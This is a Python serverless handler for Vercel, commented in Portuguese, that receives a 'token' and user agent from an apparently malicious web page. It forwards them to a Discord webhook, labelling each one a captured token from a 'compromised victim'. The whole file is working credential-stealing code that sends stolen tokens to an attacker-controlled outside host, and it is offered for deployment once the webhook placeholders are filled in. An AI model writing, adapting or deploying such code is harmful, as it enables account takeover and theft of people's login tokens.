import json
import urllib.request

# Função principal esperada pela Vercel
def handler(request):
    try:
        # Lê o body JSON enviado pelo index.html
        data = json.loads(request.body.decode('utf-8')) if request.body else {}
        
        token = data.get('token')
        ua = data.get('ua', 'Unknown')
        
        # Configuração do Webhook (SUBSTITUA AQUI)
        WEBHOOK_URL = "https://discord.com/api/webhooks/SEU_ID_WEBHOOK/AQUI_TOKEN"

        if not token:
            return {
                "statusCode": 200,
                "body": json.dumps({"status": "ok", "msg": "No token found"})
            }

        # Prepara payload pro Discord
        discord_payload = {
            "content": f"💀 **NOVO TOKEN CAPTURADO!** 💀\n\n**Token:**\n```\n{token}\n```",
            "embeds": [{
                "title": "🔥 VÍTIMA COMPROMETIDA 🔥",
                "color": 16753920,
                "fields": [{"name": "User Agent", "value": ua, "inline": False}]
            }],
            "username": "XORTRON_VERCEL"
        }

        # Envia requisição pro Webhook
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=json.dumps(discord_payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req)

        return {
            "statusCode": 200,
            "body": json.dumps({"status": "captured"})
        }

    except Exception as e:
        print(f"Error: {str(e)}") # Logs aparecem no console do deploy da Vercel
        return {
            "statusCode": 500,
            "body": json.dumps({"status": "error", "msg": str(e)})
        }
